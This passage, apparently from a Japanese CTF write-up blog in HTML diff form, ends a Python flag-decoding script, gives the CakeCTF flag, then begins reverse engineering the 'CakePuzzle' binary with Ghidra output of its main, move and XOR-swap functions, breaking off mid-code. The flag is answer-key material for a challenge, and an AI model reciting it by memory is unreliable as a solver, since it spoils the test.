+&lt;span class="n">a&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">flag_sequence&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="mi">8&lt;/span>&lt;span class="p">:(&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="mi">8&lt;/span>&lt;span class="p">]&lt;/span>
+&lt;span class="n">flag_char&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>
+&lt;span class="k">for&lt;/span> &lt;span class="n">j&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="nb">range&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">8&lt;/span>&lt;span class="p">):&lt;/span>
+&lt;span class="n">flag_char&lt;/span> &lt;span class="o">+=&lt;/span> &lt;span class="n">a&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">j&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="o">**&lt;/span>&lt;span class="n">j&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;span class="n">flag&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">append&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">flag_char&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;&amp;#34;&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">join&lt;/span>&lt;span class="p">([&lt;/span>&lt;span class="nb">chr&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">x&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="k">for&lt;/span> &lt;span class="n">x&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="n">flag&lt;/span>&lt;span class="p">]))&lt;/span>
+&lt;span class="n">get_flag_str&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">answer_sequence&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>これを実行してflagが得られました。
+よってflagは&lt;code>CakeCTF{h2fsCHAo3xOsBZefcWudTa4}&lt;/code>です。&lt;/p>
+&lt;h3 id="cakepuzzle-rev">CakePuzzle [rev]&lt;/h3>
+&lt;p>問題文を見てみると、ncでプログラムにアクセスするタイプの問題のようです。
+ncでプログラムにアクセスしてみます。&lt;code>&amp;gt;&lt;/code>だけ出てきて文字の入力が可能でした。
+しかし、どんな文字を打っても&lt;code>&amp;gt;&lt;/code>しか出てきません。&lt;/p>
+&lt;p>渡されるファイルは&lt;code>chal&lt;/code>のみです。ファイル形式は以下の通りでした。ELFです。&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">chal: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=4c2b97895e9493536557f72e973e5ed194a49854, for GNU/Linux 3.2.0, not stripped
+&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Ghidaraで静的解析します。main関数を見てみます。&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;span class="lnt">21
+&lt;/span>&lt;span class="lnt">22
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="kt">void&lt;/span> &lt;span class="nf">main&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">void&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;span class="p">{&lt;/span>
+&lt;span class="kt">int&lt;/span> &lt;span class="n">iVar1&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;span class="n">undefined8&lt;/span> &lt;span class="n">uVar2&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;span class="kt">char&lt;/span> &lt;span class="n">local_78&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="mi">112&lt;/span>&lt;span class="p">];&lt;/span>
+&lt;span class="n">alarm&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">1000&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;span class="k">while&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nb">true&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;span class="n">uVar2&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">q&lt;/span>&lt;span class="p">();&lt;/span>
+&lt;span class="k">if&lt;/span> &lt;span class="p">((&lt;/span>&lt;span class="kt">int&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="n">uVar2&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;span class="n">win&lt;/span>&lt;span class="p">();&lt;/span>
+&lt;span class="p">}&lt;/span>
+&lt;span class="n">printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;&amp;gt; &amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;span class="n">fflush&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">stdout&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;span class="n">iVar1&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">__isoc99_scanf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">DAT_00102019&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">local_78&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">iVar1&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="k">break&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;span class="n">e&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">local_78&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">]);&lt;/span>
+&lt;span class="p">}&lt;/span>
+&lt;span class="cm">/* WARNING: Subroutine does not return */&lt;/span>
+&lt;span class="n">exit&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;span class="p">}&lt;/span>
+&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>&lt;code>win&lt;/code>関数があります。これが実行できれば、flagを見せてもらえるようです。
+pwn問ではないので、プログラムがどうなっているか解析を進めていけば解けるだろうと考え、
+一文字関数の&lt;code>e&lt;/code>や&lt;code>q&lt;/code>関数を見ていきます。&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;span class="lnt">21
+&lt;/span>&lt;span class="lnt">22
+&lt;/span>&lt;span class="lnt">23
+&lt;/span>&lt;span class="lnt">24
+&lt;/span>&lt;span class="lnt">25
+&lt;/span>&lt;span class="lnt">26
+&lt;/span>&lt;span class="lnt">27
+&lt;/span>&lt;span class="lnt">28
+&lt;/span>&lt;span class="lnt">29
+&lt;/span>&lt;span class="lnt">30
+&lt;/span>&lt;span class="lnt">31
+&lt;/span>&lt;span class="lnt">32
+&lt;/span>&lt;span class="lnt">33
+&lt;/span>&lt;span class="lnt">34
+&lt;/span>&lt;span class="lnt">35
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="kt">void&lt;/span> &lt;span class="nf">e&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">char&lt;/span> &lt;span class="n">param_1&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;span class="p">{&lt;/span>
+&lt;span class="kt">int&lt;/span> &lt;span class="n">local_10&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;span class="kt">int&lt;/span> &lt;span class="n">local_c&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;span class="n">s&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">local_c&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">local_10&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">param_1&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="sc">&amp;#39;U&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">local_c&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;span class="n">f&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="n">uint&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)(&lt;/span>&lt;span class="n">M&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="p">((&lt;/span>&lt;span class="kt">long&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="n">local_c&lt;/span> &lt;span class="o">*&lt;/span> &lt;span class="mi">4&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">long&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="n">local_10&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">*&lt;/span> &lt;span class="mi">4&lt;/span>&lt;span class="p">),&lt;/span>
+&lt;span class="p">(&lt;/span>&lt;span class="n">uint&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)(&lt;/span>&lt;span class="n">M&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="p">((&lt;/span>&lt;span class="kt">long&lt;/span>&lt;span class="p">)(&lt;/span>&lt;span class="n">local_c&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">*&lt;/span> &lt;span class="mi">4&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">long&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="n">local_10&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">*&lt;/span> &lt;span class="mi">4&lt;/span>&lt;span class="p">));&lt;/span>
+&lt;span class="p">}&lt;/span>
+&lt;span class="p">}&lt;/span>
+&lt;span class="k">else&lt;/span> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">param_1&lt;/span> &lt;span class="o">&amp;lt;&lt;/span> &lt;span class="sc">&amp;#39;V&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">param_1&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="sc">&amp;#39;R&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">local_10&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="mi">3&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;span class="n">f&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="n">uint&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)(&lt;/span>&lt;span class="n">M&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="p">((&lt;/span>&lt;span class="kt">long&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="n">local_c&lt;/span> &lt;span class="o">*&lt;/span> &lt;span class="mi">4&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">long&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="n">local_10&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">*&lt;/span> &lt;span class="mi">4&lt;/span>&lt;span class="p">),&lt;/span>
+&lt;span class="p">(&lt;/span>&lt;span class="n">uint&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)(&lt;/span>&lt;span class="n">M&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="p">((&lt;/span>&lt;span class="kt">long&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="n">local_c&lt;/span> &lt;span class="o">*&lt;/span> &lt;span class="mi">4&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">long&lt;/span>&lt;span class="p">)(&lt;/span>&lt;span class="n">local_10&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">))&lt;/span> &lt;span class="o">*&lt;/span> &lt;span class="mi">4&lt;/span>&lt;span class="p">));&lt;/span>
+&lt;span class="p">}&lt;/span>
+&lt;span class="p">}&lt;/span>
+&lt;span class="k">else&lt;/span> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">param_1&lt;/span> &lt;span class="o">&amp;lt;&lt;/span> &lt;span class="sc">&amp;#39;S&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">param_1&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="sc">&amp;#39;D&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">local_c&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="mi">3&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;span class="n">f&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="n">uint&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)(&lt;/span>&lt;span class="n">M&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="p">((&lt;/span>&lt;span class="kt">long&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="n">local_c&lt;/span> &lt;span class="o">*&lt;/span> &lt;span class="mi">4&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">long&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="n">local_10&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">*&lt;/span> &lt;span class="mi">4&lt;/span>&lt;span class="p">),&lt;/span>
+&lt;span class="p">(&lt;/span>&lt;span class="n">uint&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)(&lt;/span>&lt;span class="n">M&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="p">((&lt;/span>&lt;span class="kt">long&lt;/span>&lt;span class="p">)(&lt;/span>&lt;span class="n">local_c&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">*&lt;/span> &lt;span class="mi">4&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">long&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="n">local_10&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">*&lt;/span> &lt;span class="mi">4&lt;/span>&lt;span class="p">));&lt;/span>
+&lt;span class="p">}&lt;/span>
+&lt;span class="p">}&lt;/span>
+&lt;span class="k">else&lt;/span> &lt;span class="k">if&lt;/span> &lt;span class="p">((&lt;/span>&lt;span class="n">param_1&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="sc">&amp;#39;L&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">&amp;amp;&amp;amp;&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">local_10&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">))&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;span class="n">f&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="n">uint&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)(&lt;/span>&lt;span class="n">M&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="p">((&lt;/span>&lt;span class="kt">long&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="n">local_c&lt;/span> &lt;span class="o">*&lt;/span> &lt;span class="mi">4&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">long&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="n">local_10&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">*&lt;/span> &lt;span class="mi">4&lt;/span>&lt;span class="p">),&lt;/span>
+&lt;span class="p">(&lt;/span>&lt;span class="n">uint&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)(&lt;/span>&lt;span class="n">M&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="p">((&lt;/span>&lt;span class="kt">long&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="n">local_c&lt;/span> &lt;span class="o">*&lt;/span> &lt;span class="mi">4&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">long&lt;/span>&lt;span class="p">)(&lt;/span>&lt;span class="n">local_10&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">))&lt;/span> &lt;span class="o">*&lt;/span> &lt;span class="mi">4&lt;/span>&lt;span class="p">));&lt;/span>
+&lt;span class="p">}&lt;/span>
+&lt;span class="p">}&lt;/span>
+&lt;span class="p">}&lt;/span>
+&lt;span class="k">return&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;span class="p">}&lt;/span>
+&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>標準入力から入力された文字列の先頭1文字が引数に入力されます。
+入力の文字に意味を持つのはU、R、D、Lのみのようです。そして、local_10、local_cの条件がありますが、基本的にはこれらどれかの文字を入力すると、&lt;code>f&lt;/code>関数が呼ばれるようです。
+&lt;code>f&lt;/code>関数に入力されている&lt;code>M&lt;/code>のインデックスも4の倍数であることも気になります。&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;span class="lnt">5
+&lt;/span>&lt;span class="lnt">6
+&lt;/span>&lt;span class="lnt">7
+&lt;/span>&lt;span class="lnt">8
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="kt">void&lt;/span> &lt;span class="nf">f&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">uint&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">param_1&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">uint&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">param_2&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;span class="p">{&lt;/span>
+&lt;span class="o">*&lt;/span>&lt;span class="n">param_1&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">param_1&lt;/span> &lt;span class="o">^&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">param_2&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;span class="o">*&lt;/span>&lt;span class="n">param_2&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">param_2&lt;/span> &lt;span class="o">^&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">param_1&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="c1">// param_2 = param_2 ^ (param_1 ^ param_2) = param_1
+&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">param_1&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">param_1&lt;/span> &lt;span class="o">^&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">param_2&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="c1">// param_1 = (param_1 ^ param_2) ^ param_1 = param_2
+&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">return&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;span class="p">}&lt;/span>
+&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>&lt;code>f&lt;/code>関数は引数の値どおしでxorしています。計算を追うと、これは引数である&lt;code>param_1&lt;/code>と&lt;code>param_2&lt;/code>の値を交換する処理であることが分かります。
+&lt;code>q&lt;/code>関数も見てみます。&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;span class="lnt">21
+&lt;/span>&lt;span class="lnt">22
+&lt;/span>&lt;span class="lnt">23
+&lt;/span>&lt;span class="lnt">24
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="n">undefined8&lt;/span> &lt;span class="nf">q&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">void&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;span class="p">{&lt;/span>
+&lt;span class="kt">int&lt;/span> &lt;span class="n">local_10&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;span class="kt">int&lt;/span> &lt;span class="n">local_c&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;span class="n">local_c&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;span class="k">do&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="mi">2&lt;/span> &lt;span class="o">&amp;lt;&lt;/span> &lt;span class="n">local_c&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;span class="k">return&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;span class="p">}&lt;/span>
+&lt;span class="k">for&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">local_10&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">local_10&lt;/span> &lt;span class="o">&amp;lt;&lt;/span> &lt;span class="mi">3&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">local_10&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">local_10&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">int&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)(&lt;/span>&lt;span class="n">M&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="p">((&lt;/span>&lt;span class="kt">long&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="n">local_c&lt;/span> &lt;span class="o">*&lt;/span> &lt;span class="mi">4&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">long&lt;/span>&lt;span class="p">)(&lt;/span>&lt;span class="n">local_10&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">))&lt;/span> &lt;span class="o">*&lt;/span> &lt;span class="mi">4&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">&amp;lt;=&lt;/span>
+&lt;span class="o">*&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">int&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)(&lt;/span>&lt;span class="n">M&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="p">((&lt;/span>&lt;span class="kt">long&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="n">local_c&lt;/span> &lt;span class="o">*&lt;/span> &lt;span class="mi">4&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">long&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="n">local_10&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">*&lt;/span> &lt;span class="mi">4&lt;/span>&lt;span class="p">))&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;span class="k">return&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;span class="p">}&lt;/span>
+&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">int&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)(&lt;/span>&lt;span class="n">M&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="p">((&lt;/span>&lt;span class="kt">long&lt;/span>&lt;span class="p">)(&lt;/span>&lt;span class="n">local_c&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">*&lt;/span> &lt;span class="mi">4&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">long&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="n">local_10&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">*&lt;/span> &lt;span class="mi">4&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">&amp;lt;=&lt;/span>
